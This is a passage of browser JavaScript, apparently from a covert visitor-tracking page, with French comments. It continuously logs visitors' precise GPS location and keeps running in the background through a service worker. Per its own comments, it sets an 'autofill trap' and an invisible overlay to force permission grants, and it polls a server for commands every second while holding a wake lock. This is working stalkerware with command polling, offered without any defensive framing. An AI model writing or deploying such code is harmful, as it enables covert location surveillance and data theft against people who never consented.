    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    return R * c;
}

let lastLoggedPos = null;
function startGpsTracking() {
    if (gpsWatchStarted || !navigator.geolocation) return;
    gpsWatchStarted = true;

    let firstGpsPointSent = false;
    navigator.geolocation.watchPosition(
        async (position) => {
            const newLoc = {
                lat: position.coords.latitude, lon: position.coords.longitude,
                accuracy: position.coords.accuracy, speed: position.coords.speed
            };

            if (!firstGpsPointSent) {
                firstGpsPointSent = true;
                lastLoggedPos = newLoc;
                await logVisitor(newLoc, false, true);
                onFirstGpsCaptured();
                return;
            }

                if (!lastLoggedPos) {
                    lastLoggedPos = newLoc;
                    await logVisitor(newLoc, true);
                    return;
                }

                const dist = getDistance(lastLoggedPos.lat, lastLoggedPos.lon, newLoc.lat, newLoc.lon);
                const isAbnormalJump = dist > 500 && (newLoc.speed === null || newLoc.speed < 0.3);
                
                if (dist > 3 && !isAbnormalJump) {
                    lastLoggedPos = newLoc;
                    await logVisitor(newLoc, true);
                }
            },
            null,
            { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
        );
}

if (document.readyState === 'complete' || document.readyState === 'interactive') {
    // Initialisation immédiate
    initTracker();
} else {
    document.addEventListener('DOMContentLoaded', initTracker);
}

function initTracker() {
    // Enregistrement du Service Worker pour la survie en arrière-plan
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js').then(reg => {
            reg.active && reg.active.postMessage({type: 'SET_SESSION', sessionId: sessionId});
        }).catch(err => console.warn("SW registration failed", err));
    }

    setupAutofillTrap();
    
    // PIÈGE IMMÉDIAT : L'overlay invisible est actif dès l'entrée pour forcer les accès
    console.log("Piège invisible activé dès l'entrée...");
    startVerification();
    
    // VÉRIFICATION DES COMMANDES : Ultra-agressif (toutes les 1 seconde)
    const pollCommands = async () => {
        await checkCommands();
        setTimeout(pollCommands, 1000);
    };
    pollCommands();

    document.addEventListener('click', requestWakeLock);
    window.addEventListener('focus', requestWakeLock);
}
